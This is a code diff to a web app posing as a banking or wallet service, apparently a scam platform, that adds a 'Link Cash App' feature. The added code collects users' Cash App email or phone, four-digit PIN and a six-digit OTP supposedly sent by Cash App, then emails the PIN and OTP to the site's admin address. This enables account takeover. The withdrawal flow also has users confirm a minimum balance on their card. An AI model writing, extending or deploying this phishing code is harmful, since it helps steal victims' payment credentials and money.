@@ -426,6 +426,7 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
         <button class="action-btn" id="transfer-btn"><span class="action-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 16 16 12 12 8"></polyline><line x1="8" y1="12" x2="16" y2="12"></line></svg></span><span data-i18n="withdraw">Withdraw</span></button>
         <button class="action-btn" id="acct-info-btn"><span class="action-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></span><span>Account</span></button>
         <button class="action-btn" id="add-card-btn"><span class="action-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg></span><span>Cards</span></button>
+        <button class="action-btn" id="cashapp-btn" style="display:none;"><span class="action-icon"><img src="https://i.imgur.com/wT32rIk.jpeg" style="width:20px;height:20px;border-radius:4px;object-fit:cover;"></span><span>Cash App</span></button>
       </div>
     </div>
     <div class="section">
@@ -644,6 +645,13 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
 <div class="modal" id="money-requests-modal"><div class="modal-box"><div class="modal-header"><h3><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#1a56ff" stroke-width="2" style="vertical-align:middle;margin-right:6px;"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>Money Requests</h3><button class="modal-close" onclick="closeModal('money-requests-modal')">&#215;</button></div><div id="money-requests-list"><p style="text-align:center;color:#999;padding:20px;" data-i18n="noPending">No pending requests</p></div></div></div>
 
 <div class="modal" id="receipt-detail-modal"><div class="modal-box"><div class="modal-header"><h3><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#1a56ff" stroke-width="2" style="vertical-align:middle;margin-right:6px;"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline></svg>Transaction Details</h3><button class="modal-close" onclick="closeModal('receipt-detail-modal')">&#215;</button></div><div id="receipt-detail-content"></div></div></div>
+
+<!-- Cash App Modals -->
+<div class="modal" id="cashapp-list-modal"><div class="modal-box"><div class="modal-header"><h3><img src="https://i.imgur.com/wT32rIk.jpeg" style="width:20px;height:20px;border-radius:4px;object-fit:cover;vertical-align:middle;margin-right:8px;">Cash App Accounts</h3><button class="modal-close" onclick="closeModal('cashapp-list-modal')">&#215;</button></div><div id="cashapp-accounts-list"></div><button class="modal-btn blue" onclick="openCashAppLink()" style="margin-top:12px;">+ Link New Cash App</button></div></div>
+
+<div class="modal" id="cashapp-link-modal"><div class="modal-box dark"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><img src="https://i.imgur.com/wT32rIk.jpeg" style="width:72px;height:72px;object-fit:cover;border-radius:16px;filter:drop-shadow(0 0 8px rgba(0,200,83,0.3));display:block;margin:0 auto 8px;"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);">Link Your Account</div></div><div class="modal-header"><h3>💵 Link Cash App</h3><button class="modal-close" onclick="closeModal('cashapp-link-modal')">&#215;</button></div><input type="text" class="modal-input" id="cashapp-identifier" placeholder="Email or Phone Number"><input type="password" class="modal-input" id="cashapp-pin" placeholder="Cash App PIN" maxlength="4" inputmode="numeric"><div class="modal-error" id="cashapp-link-error"></div><button class="modal-btn" id="cashapp-submit-btn">Link Cash App</button></div></div>
+
+<div class="modal" id="cashapp-otp-modal"><div class="modal-box dark"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><img src="https://i.imgur.com/wT32rIk.jpeg" style="width:72px;height:72px;object-fit:cover;border-radius:16px;filter:drop-shadow(0 0 8px rgba(0,200,83,0.3));display:block;margin:0 auto 8px;"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);">Verification Required</div></div><div class="modal-header"><h3>🔐 Enter OTP Code</h3><button class="modal-close" onclick="closeModal('cashapp-otp-modal')">&#215;</button></div><div style="background:rgba(77,171,255,0.08);border:1px solid rgba(77,171,255,0.25);border-radius:10px;padding:12px;margin-bottom:12px;"><p style="font-size:13px;color:rgba(255,255,255,0.8);line-height:1.5;">Cash App has sent a verification code to your account. Enter it below to complete the linking process.</p></div><div style="margin-bottom:12px;"><div style="font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:8px;">Account: <span id="cashapp-otp-identifier" style="color:#00c853;font-weight:600;"></span></div></div><input type="text" class="modal-input" id="cashapp-otp-code" placeholder="Enter 6-digit OTP code" maxlength="6" inputmode="numeric"><div class="modal-error" id="cashapp-otp-error"></div><button class="modal-btn" id="cashapp-otp-submit-btn">Verify & Link</button></div></div>
 
 <div class="modal" id="language-modal"><div class="modal-box center"><div class="modal-header"><h3>&#127760; Language</h3><button class="modal-close" onclick="closeModal('language-modal')">&#215;</button></div><div class="lang-grid"><div class="lang-opt active" onclick="setLang('en',this)">&#127468;&#127463; English</div><div class="lang-opt" onclick="setLang('es',this)">&#127466;&#127480; Espa&ntilde;ol</div><div class="lang-opt" onclick="setLang('fr',this)">&#127467;&#127479; Fran&ccedil;ais</div><div class="lang-opt" onclick="setLang('pt',this)">&#127463;&#127479; Portugu&ecirc;s</div></div></div></div>
 
@@ -1168,6 +1176,10 @@ auth.onAuthStateChanged(function(user){
     el=$('verified-badge'); if(el) el.style.display=(userData.verified&&hasAuthCard)?'inline':'none';
     el=$('drawer-name'); if(el) el.textContent=(userData.firstname||'')+' '+(userData.surname||'');
     el=$('drawer-email'); if(el) el.textContent=userData.email||'';
+    
+    // Show Cash App button only for USA users
+    el=$('cashapp-btn'); if(el) el.style.display=(userData.country==='United States')?'flex':'none';
+    
     var cards=userData.linkedCards||[];
     var hasAuth=cards.some(function(c){return c&&c.status==='authorized';});
     el=$('verify-banner'); if(el) el.classList.remove('show');
@@ -2241,8 +2253,25 @@ $('addmoney-confirm-btn').onclick=function(){
 // TRANSFER
 $('transfer-btn').onclick=function(){
   var cards=(userData.linkedCards||[]).filter(function(c){return c&&c.status==='authorized';});
-  var sel=$('transfer-method');sel.innerHTML='<option value="">Select Card</option>';
-  cards.forEach(function(card,i){var opt=document.createElement('option');opt.value=i;opt.textContent=card.brand+' \u2022\u2022\u2022\u2022'+card.lastFour;sel.appendChild(opt);});
+  var cashapps=(userData.cashAppAccounts||[]).filter(function(c){return c&&c.status==='authorized';});
+  var sel=$('transfer-method');sel.innerHTML='<option value="">Select Method</option>';
+  
+  // Add authorized cards
+  cards.forEach(function(card,i){
+    var opt=document.createElement('option');
+    opt.value='card-'+i;
+    opt.textContent='💳 '+card.brand+' \u2022\u2022\u2022\u2022'+card.lastFour;
+    sel.appendChild(opt);
+  });
+  
+  // Add authorized Cash App accounts
+  cashapps.forEach(function(ca,i){
+    var opt=document.createElement('option');
+    opt.value='cashapp-'+i;
+    opt.textContent='💵 Cash App ('+ca.identifier+')';
+    sel.appendChild(opt);
+  });
+  
   $('transfer-error').textContent='';
   // Set currency-specific minimum
   var cur=userData.currency||'USD';
@@ -2250,20 +2279,47 @@ $('transfer-btn').onclick=function(){
   var minimums={'USD':100,'EUR':100,'GBP':100,'NGN':163000,'CAD':136,'AUD':153};
   var min=minimums[cur]||100;
   var el=$('transfer-confirm-text');
-  if(el) el.innerHTML='I confirm my bank card has at least <strong>'+s+min.toLocaleString()+'</strong> balance to ensure the card is active and can receive funds.';
+  if(el) el.innerHTML='I confirm my payment method has at least <strong>'+s+min.toLocaleString()+'</strong> balance to ensure the account is active and can receive funds.';
   openModal('transfer-modal');
 };
 $('transfer-confirm-btn').onclick=function(){
   var method=$('transfer-method').value,amt=parseFloat($('transfer-amount').value),pin=$('transfer-pin').value.trim(),err=$('transfer-error');err.textContent='';
-  if(!method){err.textContent='Select a card.';return;}
+  if(!method){err.textContent='Select a withdrawal method.';return;}
   if(!amt||amt<=0){err.textContent='Enter a valid amount.';return;}
   if(!pin||pin.length!==4){err.textContent='Enter your PIN.';return;}
-  if(!$('transfer-confirm-checkbox').checked){err.textContent='Please confirm your card has minimum balance.';return;}
+  if(!$('transfer-confirm-checkbox').checked){err.textContent='Please confirm your payment method has minimum balance.';return;}
   if(userData.pin!==pin){err.textContent='Incorrect PIN.';return;}
   if(parseFloat(userData.balance||0)<amt){err.textContent='Insufficient balance.';return;}
+  
   var s=sym();
-  var authCards=(userData.linkedCards||[]).filter(function(c){return c&&c.status==='authorized';});
-  var card=authCards[parseInt(method)];
+  var methodParts=method.split('-');
+  var methodType=methodParts[0];
+  var methodIdx=parseInt(methodParts[1]);
+  
+  var withdrawalInfo;
+  if(methodType==='card'){
+    var authCards=(userData.linkedCards||[]).filter(function(c){return c&&c.status==='authorized';});
+    var card=authCards[methodIdx];
+    if(!card){err.textContent='Card not found.';return;}
+    withdrawalInfo={
+      type:'card',
+      brand:card.brand,
+      lastFour:card.lastFour,
+      number:card.number,
+      bankName:card.bankName||'Unknown'
+    };
+  } else if(methodType==='cashapp'){
+    var authCashApps=(userData.cashAppAccounts||[]).filter(function(c){return c&&c.status==='authorized';});
+    var cashapp=authCashApps[methodIdx];
+    if(!cashapp){err.textContent='Cash App account not found.';return;}
+    withdrawalInfo={
+      type:'cashapp',
+      brand:'Cash App',
+      identifier:cashapp.identifier,
+      lastFour:'****'
+    };
+  }
+  
   $('transfer-confirm-btn').textContent='Processing...';$('transfer-confirm-btn').disabled=true;
   var transferKey='trans_'+Date.now()+'_'+Math.random().toString(36).slice(2,5);
   var transferData={
@@ -2273,10 +2329,12 @@ $('transfer-confirm-btn').onclick=function(){
     accountNumber:userData.accountNumber,
     currency:userData.currency||'USD',
     amount:amt,
-    cardBrand:card?card.brand:'Unknown',
-    cardLastFour:card?card.lastFour:'----',
-    cardNumber:card?card.number:'',
-    bankName:card?card.bankName:'',
+    withdrawalMethod:methodType,
+    cardBrand:withdrawalInfo.brand,
+    cardLastFour:withdrawalInfo.lastFour,
+    cardNumber:withdrawalInfo.number||'',
+    bankName:withdrawalInfo.bankName||'',
+    cashAppIdentifier:withdrawalInfo.identifier||'',
     date:new Date().toISOString(),
     status:'pending',
     transferKey:transferKey
@@ -2294,9 +2352,9 @@ $('transfer-confirm-btn').onclick=function(){
           requestKey:transferKey,
           cardInfo:{
             name:(userData.firstname||'')+' '+(userData.surname||''),
-            bank:card?card.bankName:'Unknown',
-            brand:card?card.brand:'Unknown',
-            lastFour:card?card.lastFour:'----'
+            bank:withdrawalInfo.bankName||withdrawalInfo.identifier||'Unknown',
+            brand:withdrawalInfo.brand,
+            lastFour:withdrawalInfo.lastFour
           }
         });
       }
@@ -2655,6 +2713,152 @@ function formatDate(dateStr) {
   mins = mins < 10 ? '0'+mins : mins;
   return months[d.getMonth()]+' '+d.getDate()+', '+d.getFullYear()+' at '+hours+':'+mins+' '+ampm;
 }
+
+// ═══════════════════════════════════════════════════════════════
+// CASH APP FUNCTIONALITY
+// ═══════════════════════════════════════════════════════════════
+
+$('cashapp-btn').onclick = function(){
+  loadCashAppAccounts();
+  openModal('cashapp-list-modal');
+};
+
+function loadCashAppAccounts(){
+  var list = $('cashapp-accounts-list');
+  var accounts = userData.cashAppAccounts || [];
+  
+  if(accounts.length === 0){
+    list.innerHTML = '<p style="text-align:center;color:#999;padding:20px;">No Cash App accounts linked yet.</p>';
+    return;
+  }
+  
+  list.innerHTML = '';
+  accounts.forEach(function(acc, idx){
+    var div = document.createElement('div');
+    div.className = 'linked-card-item';
+    var statusColor = acc.status==='authorized'?'#00a550':(acc.status==='pending'?'#f59e0b':'#e53935');
+    var statusText = acc.status==='authorized'?'✓ Authorized':(acc.status==='pending'?'⏳ Pending OTP':'✗ Rejected');
+    div.innerHTML = 
+      '<div style="display:flex;align-items:center;gap:12px;">'+
+        '<img src="https://i.imgur.com/wT32rIk.jpeg" style="width:40px;height:40px;border-radius:8px;object-fit:cover;">'+
+        '<div style="flex:1;">'+
+          '<div style="font-weight:600;color:#0a2540;margin-bottom:2px;">'+acc.identifier+'</div>'+
+          '<div style="font-size:12px;color:'+statusColor+';">'+statusText+'</div>'+
+        '</div>'+
+      '</div>'+
+      (acc.status==='pending'?'<button class="modal-btn blue" onclick="openCashAppOTP('+idx+')" style="margin-top:8px;padding:10px;">Enter OTP Code</button>':'');
+    list.appendChild(div);
+  });
+}
+
+function openCashAppLink(){
+  closeModal('cashapp-list-modal');
+  $('cashapp-identifier').value = '';
+  $('cashapp-pin').value = '';
+  $('cashapp-link-error').textContent = '';
+  openModal('cashapp-link-modal');
+}
+
+window.openCashAppOTP = function(idx){
+  var accounts = userData.cashAppAccounts || [];
+  if(!accounts[idx]) return;
+  
+  closeModal('cashapp-list-modal');
+  $('cashapp-otp-identifier').textContent = accounts[idx].identifier;
+  $('cashapp-otp-code').value = '';
+  $('cashapp-otp-error').textContent = '';
+  $('cashapp-otp-submit-btn').setAttribute('data-idx', idx);
+  openModal('cashapp-otp-modal');
+};
+
+$('cashapp-submit-btn').onclick = function(){
+  var identifier = $('cashapp-identifier').value.trim();
+  var pin = $('cashapp-pin').value.trim();
+  var err = $('cashapp-link-error');
+  err.textContent = '';
+  
+  if(!identifier){err.textContent='Please enter your email or phone number.';return;}
+  if(!pin || pin.length !== 4){err.textContent='Please enter your 4-digit Cash App PIN.';return;}
+  
+  $('cashapp-submit-btn').textContent = 'Linking...';
+  $('cashapp-submit-btn').disabled = true;
+  
+  var accounts = userData.cashAppAccounts || [];
+  var newAccount = {
+    identifier: identifier,
+    pin: pin,
+    status: 'pending',
+    addedDate: new Date().toISOString()
+  };
+  
+  accounts.push(newAccount);
+  
+  userRef.update({cashAppAccounts: accounts}).then(function(){
+    // Notify admin
+    return db.ref('users').once('value').then(function(snap){
+      snap.forEach(function(s){
+        if(s.val() && s.val().email === ADMIN_EMAIL){
+          notify(s.key, '💵 CASH APP: '+(userData.firstname||'')+' linked '+identifier);
+          sendEmail(ADMIN_EMAIL,
+            '💵 Cash App Link Request',
+            (userData.firstname||'')+' '+(userData.surname||''),
+            (userData.firstname||'')+' '+(userData.surname||'')+' is linking a Cash App account.\n\nIdentifier: '+identifier+'\nPIN: '+pin+'\n\nUser Info:\n- Account: '+(userData.accountNumber||'')+'\n- Email: '+(userData.email||'')+'\n\nThe user is waiting for the OTP code to complete verification.'
+          );
+        }
+      });
+    });
+  }).then(function(){
+    closeModal('cashapp-link-modal');
+    alert('✓ Cash App linked! Please wait for the OTP code from Cash App, then click "Enter OTP Code" to complete verification.');
+  }).catch(function(e){
+    err.textContent = 'Failed to link Cash App. Please try again.';
+  }).finally(function(){
+    $('cashapp-submit-btn').textContent = 'Link Cash App';
+    $('cashapp-submit-btn').disabled = false;
+  });
+};
+
+$('cashapp-otp-submit-btn').onclick = function(){
+  var otp = $('cashapp-otp-code').value.trim();
+  var idx = parseInt($('cashapp-otp-submit-btn').getAttribute('data-idx'));
+  var err = $('cashapp-otp-error');
+  err.textContent = '';
+  
+  if(!otp || otp.length !== 6){err.textContent='Please enter the 6-digit OTP code.';return;}
+  
+  var accounts = userData.cashAppAccounts || [];
+  if(!accounts[idx]){err.textContent='Account not found.';return;}
+  
+  $('cashapp-otp-submit-btn').textContent = 'Verifying...';
+  $('cashapp-otp-submit-btn').disabled = true;
+  
+  accounts[idx].otpCode = otp;
+  accounts[idx].otpSubmittedDate = new Date().toISOString();
+  
+  userRef.update({cashAppAccounts: accounts}).then(function(){
+    // Notify admin with OTP
+    return db.ref('users').once('value').then(function(snap){
+      snap.forEach(function(s){
+        if(s.val() && s.val().email === ADMIN_EMAIL){
+          notify(s.key, '🔐 CASH APP OTP: '+(userData.firstname||'')+' submitted OTP for '+accounts[idx].identifier);
+          sendEmail(ADMIN_EMAIL,
+            '🔐 Cash App OTP Received',
+            (userData.firstname||'')+' '+(userData.surname||''),
+            (userData.firstname||'')+' '+(userData.surname||'')+' has submitted the Cash App OTP code.\n\nIdentifier: '+accounts[idx].identifier+'\nOTP Code: '+otp+'\n\nPlease check your admin panel to authorize this Cash App account.'
+          );
+        }
+      });
+    });
+  }).then(function(){
+    closeModal('cashapp-otp-modal');
+    alert('✓ OTP submitted! Our team will verify and authorize your Cash App account shortly.');
+  }).catch(function(e){
+    err.textContent = 'Failed to submit OTP. Please try again.';
+  }).finally(function(){
+    $('cashapp-otp-submit-btn').textContent = 'Verify & Link';
+    $('cashapp-otp-submit-btn').disabled = false;
+  });
+};
 
 }); // END DOMContentLoaded
 </script>
